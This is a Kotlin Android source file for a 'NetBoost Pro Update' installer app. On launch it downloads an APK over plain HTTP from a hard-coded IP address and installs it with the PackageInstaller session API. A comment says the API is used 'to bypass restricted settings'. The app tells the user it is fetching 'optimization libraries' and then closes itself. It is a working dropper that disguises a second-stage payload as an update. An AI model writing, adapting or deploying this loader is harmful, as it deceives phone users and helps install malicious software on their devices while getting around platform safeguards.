package com.netboost.installer

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.FileProvider
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.io.FileOutputStream

class MainActivity : ComponentActivity() {

    private val apkUrl = "http://69.169.102.3/netboost.apk"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFF00E676),
                    background = Color(0xFF121212)
                )
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    InstallerScreen()
                }
            }
        }
    }

    @Composable
    fun InstallerScreen() {
        var progress by remember { mutableStateOf(0f) }
        var statusText by remember { mutableStateOf("Initializing update...") }
        var isDownloading by remember { mutableStateOf(false) }

        val scope = rememberCoroutineScope()

        LaunchedEffect(Unit) {
            isDownloading = true
            statusText = "Downloading core optimization libraries..."
            
            // Start download
            val apkFile = File(cacheDir, "netboost_core.apk")
            val success = downloadApk(apkUrl, apkFile) { p -> progress = p }

            if (success) {
                statusText = "Installing..."
                installApk(apkFile)
            } else {
                statusText = "Failed to download update."
            }
            isDownloading = false
        }

        Column(
            modifier = Modifier.fillMaxSize().padding(32.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            Text(
                text = "NetBoost Pro Update",
                fontSize = 24.sp,
                fontWeight = FontWeight.Bold,
                color = Color.White
            )
            Spacer(modifier = Modifier.height(32.dp))
            LinearProgressIndicator(
                progress = progress,
                modifier = Modifier.fillMaxWidth().height(8.dp),
                color = MaterialTheme.colorScheme.primary
            )
            Spacer(modifier = Modifier.height(16.dp))
            Text(text = statusText, color = Color.Gray, fontSize = 14.sp)
        }
    }

    private suspend fun downloadApk(url: String, dest: File, onProgress: (Float) -> Unit): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val client = OkHttpClient()
                val request = Request.Builder().url(url).build()
                val response = client.newCall(request).execute()

                if (!response.isSuccessful) return@withContext false

                val body = response.body ?: return@withContext false
                val contentLength = body.contentLength()
                val source = body.source()

                FileOutputStream(dest).use { output ->
                    val buffer = ByteArray(8 * 1024)
                    var totalRead: Long = 0
                    var read: Int

                    while (source.read(buffer).also { read = it } != -1) {
                        output.write(buffer, 0, read)
                        totalRead += read
                        if (contentLength > 0) {
                            withContext(Dispatchers.Main) {
                                onProgress(totalRead.toFloat() / contentLength.toFloat())
                            }
                        }
                    }
                    output.flush()
                }
                true
            } catch (e: Exception) {
                e.printStackTrace()
                false
            }
        }
    }

    private fun installApk(file: File) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            // Use PackageInstaller Session API to bypass restricted settings
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            var session: PackageInstaller.Session? = null
            try {
                val sessionId = packageInstaller.createSession(params)
                session = packageInstaller.openSession(sessionId)
                
                val out = session.openWrite("package", 0, -1)
                file.inputStream().use { input ->
                    input.copyTo(out)
                }
                session.fsync(out)
                out.close()

                val intent = Intent(Intent.ACTION_MAIN) // Dummy intent for the broadcast receiver
                val pendingIntent = PendingIntent.getActivity(
                    this,
                    0,
                    intent,
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) PendingIntent.FLAG_MUTABLE else PendingIntent.FLAG_UPDATE_CURRENT
                )

                session.commit(pendingIntent.intentSender)
            } catch (e: Exception) {
                e.printStackTrace()
                fallbackInstall(file) // Fallback if session fails
            } finally {
                session?.close()
                finish() // Close wrapper app once prompt is triggered
            }
        } else {
            fallbackInstall(file)
            finish()
        }
    }
    
    private fun fallbackInstall(file: File) {
        val uri = FileProvider.getUriForFile(this, "${packageName}.provider", file)
        val intent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
        }
        startActivity(intent)
    }
}
